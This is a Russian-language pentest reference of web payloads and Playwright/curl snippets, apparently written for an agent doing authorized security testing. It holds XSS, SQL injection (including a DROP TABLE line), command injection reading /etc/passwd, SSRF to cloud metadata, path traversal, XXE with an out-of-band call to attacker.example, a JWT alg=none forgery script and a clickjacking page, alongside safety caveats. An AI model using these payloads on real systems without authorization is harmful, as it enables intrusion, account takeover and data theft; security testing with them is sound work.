# Библиотека пейлоадов и Playwright-сниппетов

Используй пейлоады как стартовую точку. Адаптируй под конкретный эндпоинт и стек. Всегда фиксируй фактический запрос и ответ как PoC.

## XSS

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
"><svg/onload=alert(document.domain)>
'"><script>alert(1)</script>
javascript:alert(1)
```

Обходы экранирования (безопасные диагностические маркеры без отправки данных на внешние домены):
```html
<svg onload=alert(1)>
<img src=x onerror="console.log(document.domain)">
<iframe srcdoc="<script>alert(document.domain)</script>">
```

Для DOM-XSS проверяй, как `location.hash`/`location.search` попадают в `innerHTML`/`eval`.

## SQL-инъекция (подтверждение)

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' UNION SELECT null--
1; DROP TABLE users;--
```

Признаки: изменение набора данных, обход логина, ошибка 500 с SQL-текстом, разное время ответа. Не запускай destructive (`DROP`) — только чтение.

## NoSQL и ORM Operator Injection (Mongo, Prisma, Sequelize, Django ORM)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$where": "1==1"}
{"token": {"not": null}}
{"token": {"startsWith": ""}}
```

## Command injection

```bash
; id
&& whoami
| cat /etc/passwd
$(whoami)
`whoami`
```

## SSRF

```text
http://127.0.0.1:{порт}
http://localhost
http://169.254.169.254/latest/meta-data/
http://[::1]
http://0.0.0.0
http://2130706433
```

Для доказательства используй локальный HTTP-слушатель (`python -m http.server 8000` или `python3 -m http.server 8000` — работает кроссплатформенно на Linux/macOS/Windows) или внутренний известный маршрут и сравнивай ответ/время.

## Path Traversal (Linux / macOS / Windows)

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f
..\..\..\..\Windows\win.ini
..%5c..%5c..%5c..%5cWindows%5cwin.ini
```

## XXE (только если в приложении есть парсинг XML/SOAP/SVG)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

Ссылка вместо локального файла (blind XXE / out-of-band, через свой listener):

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.example/xxe">]>
<root>&xxe;</root>
```

SVG-вариант (если загрузка SVG обрабатывается XML-парсером):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

Признак: содержимое файла/ответ listener'а попадает в ответ приложения или в лог. Не используй `file://` пути к чувствительным системным файлам за пределами своего тестового окружения.

## SSTI (Server-Side Template Injection)

Безопасные диагностические маркеры по экосистемам (без разрушительного эффекта, проверяют факт вычисления выражений шаблонизатором):

```text
# Универсальные арифметические пробники
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
@(7*7)
[[${7*7}]]

# Отличие Jinja2 (Python) от Twig (PHP) при {{7*'7'}}:
# Jinja2 вернёт '7777777', Twig вернёт '49'
{{7*'7'}}

# Thymeleaf / Spring SpEL (Java)
[[${7*7}]]

# FreeMarker / Velocity (Java), Mako (Python)
${7*7}

# EJS (Node.js), ERB (Ruby)
<%= 7*7 %>

# Pug (Node.js), Slim / Haml (Ruby)
#{7*7}

# Razor (.NET)
@(7*7)
```

Если в ответе вместо исходной строки появилось вычисленное значение (`49` или `7777777`) — пользовательский ввод попадает в шаблон до компиляции, SSTI подтверждена.

## Prototype Pollution (только для JavaScript / TypeScript)

В JSON-теле запроса, попадающем в глубокое рекурсивное слияние объектов (`lodash.merge`, `_.defaultsDeep`, `jQuery.extend(true, ...)`, кастомный рекурсивный merge; обычный `Object.assign` поверхностный и прототип не загрязняет):

```json
{"__proto__": {"polluted": "1"}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Проверка эффекта: после отправки создай новый обычный объект в приложении (например, через другой запрос) и проверь, не появилось ли у него неожиданное поле (`polluted`/`isAdmin`) — признак загрязнения `Object.prototype`. Для DoS-варианта: `{"__proto__": {"toString": null}}` может вызвать падение сериализации в других частях приложения.

## Open Redirect

```text
//evil.example
/\evil.example
https:evil.example
{протокол}://{домен}@evil.example
{протокол}://{домен}.evil.example
/%2f%2fevil.example
```

Подставляй в параметры `redirect`, `next`, `returnUrl`, `continue`, `redirect_uri`. Признак: браузер/сервер уходит на внешний домен вместо ожидаемого.

## Clickjacking PoC

Если отсутствует `X-Frame-Options`/`frame-ancestors` в CSP — сохрани и открой локально HTML ниже, замени URL на целевую страницу с чувствительным действием:

```html
<!DOCTYPE html>
<html>
<head><style>
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }
  button { position: absolute; top: 300px; left: 300px; z-index: 1; }
</style></head>
<body>
  <button>Нажми меня</button>
  <iframe src="{протокол}://{домен}:{порт}/account/delete"></iframe>
</body>
</html>
```

Если целевая кнопка внутри iframe оказывается под видимой кнопкой — clickjacking подтверждён.

## JWT `alg=none` (шаговая инструкция)

1. Раздели токен на три части по `.`: `header.payload.signature`.
2. Декодируй `header` (base64url) — получишь `{"alg":"HS256","typ":"JWT"}`.
3. Замени на `{"alg":"none","typ":"JWT"}` и закодируй обратно в base64url **без** padding (`=`).
4. Декодируй `payload`, поменяй нужные поля (например `role`/`userId`), закодируй обратно тем же способом.
5. Собери токен как `header.payload.` — с точкой в конце и **пустой** третьей частью (или вообще без неё, в зависимости от реализации).
6. Отправь запрос с этим токеном в заголовке `Authorization: Bearer <token>` — если сервер принял его без проверки подписи, уязвимость подтверждена.

```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "1", "role": "admin"}).encode())
forged_token = f"{header}.{payload}."
print(forged_token)
```

## GraphQL

Introspection-запрос (проверка, доступна ли полная схема API в проде):

```graphql
{
  __schema {
    types {
      name
      fields { name }
    }
  }
}
```

Alias-based batching (одним HTTP-запросом — множество вызовов одного резолвера, обход rate limit на уровне запросов):

```graphql
query {
  a: login(email: "a@b.c", password: "guess1") { token }
  b: login(email: "a@b.c", password: "guess2") { token }
  c: login(email: "a@b.c", password: "guess3") { token }
}
```

## Race Condition / TOCTOU

Параллельная отправка одного и того же мутирующего запроса (например, применение промокода/списание баланса) для проверки гонки:

```python
import asyncio
from playwright.async_api import async_playwright

async def fire(ctx, url, token):
    return await ctx.request.post(url, headers={"Authorization": f"Bearer {token}"})

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        ctx = await browser.new_context()
        url = "{протокол}://{домен}:{порт}/api/coupons/APPLY10/redeem"
        token = "<token>"
        results = await asyncio.gather(*[fire(ctx, url, token) for _ in range(20)])
        print([r.status for r in results])
        await browser.close()

asyncio.run(main())
```

Признак: купон применился более одного раза / баланс списался некорректно — сравни итоговое состояние ресурса с ожидаемым (должно быть ровно одно успешное применение).

## User enumeration / auth

Сравни ответы на login/register/recovery для существующего и несуществующего пользователя (статус, текст ошибки, время ответа).

## Загрузка файлов (проверка безопасной отдачи SVG / HTML)

Минимальный тестовый SVG для проверки, отдаёт ли сервер загруженный файл с `Content-Type: image/svg+xml` / `text/html` без `Content-Disposition: attachment` и `X-Content-Type-Options: nosniff`:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="console.log(document.domain)"/>
```

## Playwright-сниппеты

Во всех сниппетах ниже подставляй реальный целевой адрес `{протокол}://{домен}:{порт}` (тестовый стенд, staging, prod или локальный инстанс; если порт стандартный 80/443 — `:{порт}` опускается).

Запуск локального сервера через скилл `webapp-testing` (применяется только если целевой стенд ещё не запущен и поднимается локально):
```bash
python scripts/with_server.py --server "<команда запуска API>" --port {порт_api} --server "<команда запуска фронтенда>" --port {порт_ui} -- python probe.py
```

Перехват и подмена заголовков/ответов:
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.route("**/*", lambda route: route.continue_())
    page.on("response", lambda r: print(r.status, r.url, r.headers))
    page.goto("{протокол}://{домен}:{порт}")
    page.wait_for_load_state("networkidle")
    browser.close()
```

Сырой HTTP-запрос с произвольными заголовками (обход браузерных ограничений):
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    ctx = browser.new_context()
    req = ctx.request.post(
        "{протокол}://{домен}:{порт}/api/auth/login",
        headers={"Content-Type": "application/json", "Origin": "https://evil.example"},
        data='{"email":"a@b.c","password":"wrong"}',
    )
    print(req.status, req.headers, req.body())
    browser.close()
```

Проверка IDOR (запрос от пользователя A к ресурсу B):
```python
req = ctx.request.get(
    "{протокол}://{домен}:{порт}/api/items/<B_id>",
    headers={"Authorization": "Bearer <token_A>"},
)
print(req.status, req.body())
```

Проверка rate limiting (N запросов подряд):
```python
for i in range(20):
    req = ctx.request.post("{протокол}://{домен}:{порт}/api/auth/login",
                           data='{"email":"a@b.c","password":"wrong"}')
    print(i, req.status)
```

Подмена `Origin` для проверки CORS (проверяем отражение произвольного домена, обходы по префиксу/суффиксу и `Origin: null` в сочетании с `access-control-allow-credentials`):
```python
for origin in (
    "https://evil.example",
    "{протокол}://{домен}.evil.example",
    "{протокол}://evil{домен}",
    "null",
):
    resp = ctx.request.get("{протокол}://{домен}:{порт}/api/private",
                           headers={"Origin": origin})
    print(
        origin,
        resp.headers.get("access-control-allow-origin"),
        resp.headers.get("access-control-allow-credentials"),
    )
```

## curl-эквиваленты (быстро, без браузера; на Windows в PowerShell используй `curl.exe` или запускай из `bash`)

```bash
curl -i -X POST {протокол}://{домен}:{порт}/api/auth/login -H "Content-Type: application/json" -d '{"email":"a@b.c","password":"wrong"}'
curl -i {протокол}://{домен}:{порт}/api/items/<id> -H "Authorization: Bearer <token>"
curl -i -H "Origin: https://evil.example" {протокол}://{домен}:{порт}/api/private
```
